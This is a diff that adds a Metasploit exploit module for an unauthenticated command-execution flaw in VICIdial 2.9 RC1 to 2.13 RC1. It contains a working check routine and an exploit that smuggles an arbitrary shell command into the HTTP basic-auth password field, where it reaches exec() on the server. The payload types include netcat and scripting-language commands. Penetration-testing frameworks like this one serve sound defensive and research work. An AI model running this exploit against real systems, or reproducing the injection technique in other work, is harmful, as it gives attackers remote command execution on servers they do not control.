@@ -1,0 +1,112 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'VICIdial user_authorization Unauthenticated Command Execution',
+      'Description'    => %q{
+        This module exploits a vulnerability in VICIdial versions
+        2.9 RC 1 to 2.13 RC1 which allows unauthenticated users
+        to execute arbitrary operating system commands as the web
+        server user if password encryption is enabled (disabled
+        by default).
+
+        When password encryption is enabled the user's password
+        supplied using HTTP basic authentication is used in a call
+        to exec().
+
+        This module has been tested successfully on version 2.11 RC2
+        and 2.13 RC1 on CentOS.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => 'Brendan Coles <bcoles[at]gmail.com>',
+      'References'     =>
+        [
+          ['URL', 'http://www.vicidial.org/VICIDIALmantis/view.php?id=1016']
+        ],
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          # HTTP Basic authentication password
+          'Space' => 2048,
+          # apostrophe ('), quote ("), semi-colon (;) and backslash (\)
+          # are removed by preg_replace
+          'BadChars' => "\x00\x0A\x22\x27\x3B\x5C",
+          'DisableNops' => true,
+          'Compat' =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic perl python netcat'
+            }
+        },
+      'Targets'        => [[ 'Automatic Targeting', {} ]],
+      'Privileged'     => false,
+      'DisclosureDate' => 'May 26 2017',
+      'DefaultTarget'  => 0))
+    register_options([ OptString.new('TARGETURI', [true, 'The base path to VICIdial', '/vicidial/']) ])
+    deregister_options('USERNAME', 'PASSWORD')
+  end
+
+  def check
+    user = rand_text_alpha(rand(10) + 5)
+    pass = "#{rand_text_alpha(rand(10) + 5)}&#"
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'vicidial_sales_viewer.php'),
+                           'authorization' => basic_auth(user, pass)
+
+    unless res
+      vprint_status 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code != 401
+      vprint_status "#{peer} Unexpected reply. Expected authentication failure."
+      return CheckCode::Safe
+    end
+
+    # Check for input filtering of '#' and '&' characters in password
+    # Response for invalid credentials is in the form of: |<username>|<password>|BAD|
+    if res.body !~ /\|#{user}\|#{pass}\|BAD\|/
+      vprint_status "#{peer} Target is patched."
+      return CheckCode::Safe
+    end
+
+    # Check for ../agc/bp.pl password encryption script
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, '..', 'agc', 'bp.pl')
+    if res && res.code == 200 && res.body =~ /Bcrypt password hashing script/
+      vprint_status "#{peer} Password encryption is supported, but may not be enabled."
+      return CheckCode::Appears
+    end
+
+    vprint_status "#{peer} Could not verify whether password encryption is supported."
+    CheckCode::Detected
+  end
+
+  def execute_command(cmd, opts = {})
+    user = rand_text_alpha(rand(10) + 5)
+    pass = "#{rand_text_alpha(rand(10) + 5)}& #{cmd} #"
+
+    print_status "#{peer} Sending payload (#{cmd.length} bytes)"
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'vicidial_sales_viewer.php'),
+                           'authorization' => basic_auth(user, pass)
+
+    if !res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    elsif res.code == 401 && res.body =~ /#{user}/ && res.body =~ /BAD/
+      print_good "#{peer} Payload sent successfully"
+    else
+      fail_with(Failure::UnexpectedReply, 'Unexpected reply')
+    end
+  end
+
+  def exploit
+    execute_command(payload.encoded)
+  end
+end
